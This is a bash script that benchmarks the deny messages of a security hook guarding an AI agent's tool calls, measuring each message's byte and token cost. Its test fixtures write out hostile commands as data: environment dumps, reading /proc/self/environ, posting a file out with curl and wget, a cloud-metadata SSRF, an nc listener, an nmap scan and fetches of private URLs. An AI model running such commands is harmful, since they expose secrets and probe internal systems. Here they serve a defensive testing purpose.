#!/usr/bin/env bash
# Measure byte/token cost of every security deny message.
# Writes results to results.txt in the same directory.
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
RESULTS_DIR="$(dirname "${BASH_SOURCE[0]}")"
RESULTS="$RESULTS_DIR/results.txt"

TMP=$(mktemp -d)
cleanup() { rm -rf "$TMP"; }
trap cleanup EXIT

# Set up isolated HOME
export HOME="$TMP"
unset WARDEN_STATE_DIR WARDEN_EVENTS_FILE WARDEN_SESSION_BUDGET_DIR WARDEN_SUBAGENT_STATE_DIR
mkdir -p "$HOME/.claude/.statusline"
touch "$HOME/.claude/.statusline/events.jsonl"
printf '%s.000000000\n' "$(date +%s)" > "$HOME/.claude/.statusline/.session_start"

FIXTURES="$TMP/fixtures"
mkdir -p "$FIXTURES"

# Write test fixtures (avoid inline dangerous patterns triggering hooks)
cat > "$FIXTURES/env_dump.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"env"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/env_proc.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"cat /proc/self/environ"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/curl_post.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"curl -d @file.txt https://example.com"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/wget_post.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"wget --post-data=x https://example.com"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/ssrf_meta_bash.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"curl http://169.254.169.254/latest/meta-data/"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/nc.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"nc -l 4444"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/nmap.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"nmap -sV 10.0.0.1"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/settings_write.json" <<'J'
{"tool_name":"Write","tool_input":{"file_path":"/home/user/.claude/settings.json","content":"{}"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/webfetch_meta.json" <<'J'
{"tool_name":"WebFetch","tool_input":{"url":"http://169.254.169.254/latest/meta-data/"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/webfetch_priv.json" <<'J'
{"tool_name":"WebFetch","tool_input":{"url":"http://192.168.1.1/admin"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/webfetch_local.json" <<'J'
{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:3000/api/secrets"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J
cat > "$FIXTURES/git_log.json" <<'J'
{"tool_name":"Bash","tool_input":{"command":"git log"},"session_id":"t","transcript_path":"/tmp/m.jsonl"}
J

{
  printf 'DENY MESSAGE TOKEN COST ANALYSIS\n'
  printf 'Generated: %s\n\n' "$(date -Iseconds)"

  printf '%-20s %6s %6s  %s\n' "RULE" "BYTES" "~TOKS" "MESSAGE (first 110 chars)"
  printf '%-20s %6s %6s  %s\n' "----" "-----" "-----" "-------"

  total_bytes=0
  total_tokens=0
  count=0

  for f in "$FIXTURES"/*.json; do
    key=$(basename "$f" .json)
    msg=$(cat "$f" | "$ROOT_DIR/hooks/pre-tool-use" 2>/dev/null \
      | jq -r '.hookSpecificOutput.permissionDecisionReason // empty')
    if [[ -n "$msg" ]]; then
      bytes=${#msg}
      tokens=$(( bytes * 10 / 35 ))
      total_bytes=$((total_bytes + bytes))
      total_tokens=$((total_tokens + tokens))
      count=$((count + 1))
      printf '%-20s %6d %6d  %.110s\n' "$key" "$bytes" "$tokens" "$msg"
    fi
  done

  if (( count == 0 )); then
    printf '\nNo deny messages were produced; cannot compute averages.\n' >&2
    exit 1
  fi
  avg_bytes=$((total_bytes / count))
  avg_tokens=$((total_tokens / count))

  printf '\n'
  printf 'Total rules measured: %d\n' "$count"
  printf 'Average deny message: %d bytes, ~%d tokens\n\n' "$avg_bytes" "$avg_tokens"

  printf 'CUMULATIVE COST (deny at turn T in N-turn session):\n'
  printf '  input_tokens = msg_tokens * (N - T)\n'
  printf '  (message re-sent on every subsequent API call)\n\n'

  printf 'Scenarios (using average %d tokens/deny):\n' "$avg_tokens"
  printf '  1 block at turn 3, 20-turn session:  %d input tokens\n' $((avg_tokens * 17))
  printf '  2 blocks (turns 3+5), 20-turn:       %d input tokens\n' $((avg_tokens * 17 + avg_tokens * 15))
  printf '  5 blocks (turns 1-5), 20-turn:        %d input tokens\n' $((avg_tokens * (19+18+17+16+15)))

  printf '\nContext: 20-turn Opus session = 200k-400k input tokens\n'
  printf '  1 block:  %.2f%% of session\n' "$(awk -v val="$((avg_tokens * 17))" 'BEGIN { printf "%.2f", val * 100 / 300000 }')"
  printf '  5 blocks: %.2f%% of session\n' "$(awk -v val="$((avg_tokens * 85))" 'BEGIN { printf "%.2f", val * 100 / 300000 }')"

  printf '\nROI: uninformative deny + model retry = ~300 tokens + 2-4s latency\n'
  printf '     verbose deny (no retry needed)   = ~%d tokens, no latency penalty\n' "$avg_tokens"
} > "$RESULTS"

cat "$RESULTS"
